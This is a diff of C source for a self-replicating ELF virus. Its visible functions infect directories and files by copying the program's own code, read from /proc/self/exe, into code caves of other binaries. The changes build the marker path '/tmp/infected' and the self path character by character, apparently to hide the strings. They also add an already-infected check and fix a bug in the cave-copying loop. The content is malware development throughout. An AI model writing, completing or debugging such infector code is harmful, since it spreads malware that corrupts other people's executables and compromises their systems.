@@ -83,10 +83,45 @@ main(void) {
 void
 _start() {
 #endif
-    __attribute__((section(".text"))) volatile static char path_self[] = "/proc/self/exe";
-    // int fd_in = ft_open(infect_test, O_RDONLY, 0);
-    // if (fd_in < 0) infected = 1;
+    // __attribute__((section(".text"))) volatile static char infect_test[] = {'/', 't', 'm', 'p', '/', 'i', 'n', 'f', 'e', 'c', 't', 'e', 'd', '\0'};
+    volatile char infect_test[15];
+    infect_test[0] = '/';
+    infect_test[1] = 't';
+    infect_test[2] = 'm';
+    infect_test[3] = 'p';
+    infect_test[4] = '/';
+    infect_test[5] = 'i';
+    infect_test[6] = 'n';
+    infect_test[7] = 'f';
+    infect_test[8] = 'e';
+    infect_test[9] = 'c';
+    infect_test[10] = 't';
+    infect_test[11] = 'e';
+    infect_test[12] = 'd';
+    infect_test[13] = '\0';
+    ft_write(1, infect_test, ft_strlen(infect_test));
+    int fd_in = ft_open(infect_test, O_RDONLY, 0);
+    if (fd_in < 0) infected = 1;
 
+    volatile static char path_self[16];
+
+    // Then in initialization:
+    path_self[0] = '/';
+    path_self[1] = 'p';
+    path_self[2] = 'r';
+    path_self[3] = 'o';
+    path_self[4] = 'c';
+    path_self[5] = '/';
+    path_self[6] = 's';
+    path_self[7] = 'e';
+    path_self[8] = 'l';
+    path_self[9] = 'f';
+    path_self[10] = '/';
+    path_self[11] = 'e';
+    path_self[12] = 'x';
+    path_self[13] = 'e';
+    path_self[14] = '\0';
+    ft_write(1, path_self, ft_strlen(path_self));
     int fd_self = ft_open(path_self, O_RDONLY, 0);
     if (fd_self < 0) ft_exit(1);
 
@@ -136,6 +171,7 @@ infect_dir(volatile char *dir_path, volatile file *file_self) {
 
 __attribute__((always_inline)) inline int
 infect_file(volatile char *path, volatile file *file_self) {
+    if (infected) ft_exit(55);
     int fd_target = ft_open(path, O_RDWR, 0);
     if (fd_target < 0) return (1);
 
@@ -361,7 +397,7 @@ copy_entries_into_code_caves(volatile entry *entries_target, volatile entry *ent
                 ft_memcpy(file_self->mem + entry_self->start, file_target->mem + cave->start, entry_self->size);
                 cave->start += entry_self->size;
                 cave->size -= entry_self->size;
-                entry_target += entry_self->size;
+                entry_target->size += entry_self->size;
                 entry_self_index++;
             } else {
                 char nl = '\n';
